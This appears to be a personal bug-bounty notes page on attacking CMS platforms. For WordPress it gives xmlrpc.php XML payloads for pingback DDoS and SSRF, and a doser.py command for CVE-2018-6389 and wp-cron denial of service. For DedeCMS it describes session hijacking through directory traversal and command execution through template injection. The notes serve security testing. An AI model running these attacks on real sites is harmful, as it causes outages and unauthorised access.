---
title: CMS
toc: true
date: 2021-04-14 11:42:59
tags: Summary
categories: [100 Cyber security, 110 Bug bounty, 112 Ideas]
---

## 指纹识别
  * Wappalyzer

## Wordpress

### Wordpress Detection
  * Wappalyzer
  * WhatRuns
  * BuildWith
### General Scan Tool
  * WpScan
### xmlrpc.php
  * one of the common issue on wp, to get credit, u need to fully exploit n show the impact.
  * detection:
    * site.com/xmlrpc.php
    * Get the error message about POST request only
  * exploit
    ***ref: https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/***
    ***https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32***
    * Intercept the request and change the method GET to POST
    * List all Methods
```
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
  * pingback.ping DDoS

```
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```

  * pingback.ping SSRF (internal PORT scan only)

```
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
  * tools
  xmlrpc-scan https://github.com/nullfil3/xmlrpc-scan

### CVE-2018-6389 (wp <= 4.9.3)
  * detection
    * https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9
  * exploit
    * use DDoS (Doser https://github.com/quitten/doser.py)

    ```
python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'
    ```

### WP Cornjob DOS
  * detection
    * view site.com/wp-cron.php, You will see a Blank page with 200 HTTP status code
  * exploit
    * same tool as above (Doser)

    ```
    You will see a Blank page with 200 HTTP status code
    ```
    ***ref: https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30***
### WP User Enumeration
  * site.com/wp-json/wp/v2/users/
  * mostly not acceptable, can be used to extend the impact tho

## Dedecms

### win版本后台目录爆破
https://xz.aliyun.com/t/2064

### 利用会员密码重置漏洞重置管理员密码

### 关闭会员注册如何重置管理员密码
在Dedecms中，管理员登录过后台，就会在data目录下有一个相应的session（`eg:192.168.102.194/uploads/data/session_40b6938a56`）文件。通过目录遍历获取session值（sess_blabla），通过editcookie修改cookie(blabla)，进入后台。

### 后台内恶意执行
在模板的标签源码碎片管理中插入一段恶意代码，即可执行任意命令。
